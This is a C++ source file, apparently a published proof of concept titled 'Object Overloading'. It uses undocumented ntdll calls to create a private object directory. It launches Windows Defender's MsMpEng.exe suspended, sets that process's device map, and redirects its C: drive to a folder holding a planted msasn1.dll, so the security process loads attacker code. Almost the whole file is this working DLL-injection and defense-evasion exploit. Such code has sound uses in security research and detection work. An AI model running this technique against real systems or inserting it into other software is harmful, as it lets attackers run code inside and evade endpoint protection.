#include <iostream>
#include <windows.h>
#include <winternl.h>

#define SYMBOLIC_LINK_ALL_ACCESS 0xF0001
#define DIRECTORY_ALL_ACCESS 0xF000F
#define ProcessDeviceMap 23

#define MAX_SYMLINK_PATH_COUNT 256

typedef NTSYSAPI NTSTATUS (*_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef NTSYSAPI VOID (*_RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS (*_NtCreateSymbolicLinkObject)(PHANDLE pHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING DestinationName);
typedef NTSYSAPI NTSTATUS (*_NtCreateDirectoryObject)(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS (*_NtOpenDirectoryObject)(PHANDLE DirectoryObjectHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS (*_NtQuerySymbolicLinkObject)(HANDLE LinkHandle, PUNICODE_STRING LinkTarget, PULONG ReturnedLength);
typedef NTSYSAPI NTSTATUS (*_NtOpenSymbolicLinkObject)(PHANDLE LinkHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateDirectoryObject pNtCreateDirectoryObject;
_NtSetInformationProcess pNtSetInformationProcess;
_NtCreateSymbolicLinkObject pNtCreateSymbolicLinkObject;
_NtOpenDirectoryObject pNtOpenDirectoryObject;
_NtQuerySymbolicLinkObject pNtQuerySymbolicLinkObject;
_NtOpenSymbolicLinkObject pNtOpenSymbolicLinkObject;

void loadAPIs(void) {
	pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlInitUnicodeString");
	pNtCreateDirectoryObject = (_NtCreateDirectoryObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtCreateDirectoryObject");
	pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetInformationProcess");
	pNtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtCreateSymbolicLinkObject");
	pNtOpenDirectoryObject = (_NtOpenDirectoryObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtOpenDirectoryObject");
	pNtQuerySymbolicLinkObject = (_NtQuerySymbolicLinkObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQuerySymbolicLinkObject");
	pNtOpenSymbolicLinkObject = (_NtOpenSymbolicLinkObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtOpenSymbolicLinkObject");

	if (pRtlInitUnicodeString == NULL ||
		pNtCreateDirectoryObject == NULL ||
		pNtSetInformationProcess == NULL ||
		pNtCreateSymbolicLinkObject == NULL ||
		pNtOpenDirectoryObject == NULL ||
		pNtQuerySymbolicLinkObject == NULL ||
		pNtOpenSymbolicLinkObject == NULL) {

		printf("[!] Could not load all API's\n");
		exit(1);
	}
}

BOOL createSymbolicLinkPath(UNICODE_STRING *generatedLinkPath, PWSTR drivePath) {
	HANDLE symlinkHandle;
	UNICODE_STRING objSymLink;
	UNICODE_STRING objTruePath;
	OBJECT_ATTRIBUTES objAttrSymLink;
	ULONG retLen;

	pRtlInitUnicodeString(&objSymLink, L"\\??\\C:");
	InitializeObjectAttributes(&objAttrSymLink, &objSymLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

	objTruePath.Length = 0;
	objTruePath.MaximumLength = MAX_SYMLINK_PATH_COUNT * 2;
	objTruePath.Buffer = (PWSTR)malloc(MAX_SYMLINK_PATH_COUNT * 2);

	if (pNtOpenSymbolicLinkObject(&symlinkHandle, GENERIC_READ, &objAttrSymLink) != 0) {
		return FALSE;
	}
	
	if (pNtQuerySymbolicLinkObject(symlinkHandle, &objTruePath, &retLen) != 0) {
		return FALSE;
	}

	retLen = swprintf(objTruePath.Buffer, MAX_SYMLINK_PATH_COUNT, L"%s\\%s", objTruePath.Buffer, drivePath);

	generatedLinkPath->Buffer = objTruePath.Buffer;
	generatedLinkPath->Length = lstrlenW(objTruePath.Buffer) * 2;
	generatedLinkPath->MaximumLength = objTruePath.MaximumLength;

	return TRUE;

}

BOOL directoryExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL fileExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);
	
	return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

int main() {

	OBJECT_ATTRIBUTES objAttrDir;
	UNICODE_STRING objName;
	HANDLE dirHandle;
	HANDLE symlinkHandle;
	NTSTATUS status;
	OBJECT_ATTRIBUTES objAttrLlink;
	UNICODE_STRING name;
	UNICODE_STRING target;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE eventHandle;

	printf("Object Overloading POC from @_xpn_\n\n");

	printf("[*] Loading APIs\n");
	loadAPIs();

	// First we need to create our new object directory
	printf("[*] Creating new directory object\n");
	pRtlInitUnicodeString(&objName, L"\\??\\wibble");
	InitializeObjectAttributes(&objAttrDir, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = pNtCreateDirectoryObject(&dirHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
	if (status != 0) {
		printf("[!] Error creating Object directory\n");
		return 1;
	}

	if (!fileExists("C:\\test\\windows\\system32\\msasn1.dll")) {
		printf("[!] DLL does not exist at C:\\test\\windows\\system32\\msasn1.dll");
		return 1;
	}

	// Now we'll spawn our target process suspended
	printf("[*] Spawning target process\n");
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);

	CreateProcessA(NULL, (LPSTR)"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2111.5-0\\MsMpEng.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	//CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\defrag.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// Next we set the ProcessDeviceMap for the new process
	status = pNtSetInformationProcess(pi.hProcess, (PROCESS_INFORMATION_CLASS)23, &dirHandle, sizeof(dirHandle));
	if (status != 0) {
		printf("[!] Error setting ProcessDeviceMap\n");
		return 2;
	}

	if (!createSymbolicLinkPath(&target, (PWSTR)L"test")) {
		printf("[!] Error getting symblic path for C:\n");
		return 2;
	}

	// Next we create our symbolic link to overload the C: drive from GLOBAL??
	wprintf(L"[*] Updating C:\\ to point to %s\n", target.Buffer);
	pRtlInitUnicodeString(&name, L"C:");
	InitializeObjectAttributes(&objAttrLlink, &name, OBJ_CASE_INSENSITIVE, dirHandle, NULL);

	status = pNtCreateSymbolicLinkObject(&symlinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &objAttrLlink, &target);
	if (status != 0) {
		printf("[!] Error creating symbolic link\n");
		return 3;
	}

	// Now resume the thread so it will continue and loads its DLLs
	printf("[*] Resuming thread for suspended process... should now be using our new drive location\n");
	ResumeThread(pi.hThread);

	// Wait for DLL to tell us that it has been loaded
	eventHandle = CreateEventW(NULL, TRUE, FALSE, TEXT("wibbleevent"));
	printf("[*] Waiting for DLL to signal it has been loaded\n");
	WaitForSingleObject(eventHandle, INFINITE);

	// Close (and therefore delete) the symlink to restore access to C: for the process
	printf("[*] Closing symbolic link handle\n");
	CloseHandle(symlinkHandle);
}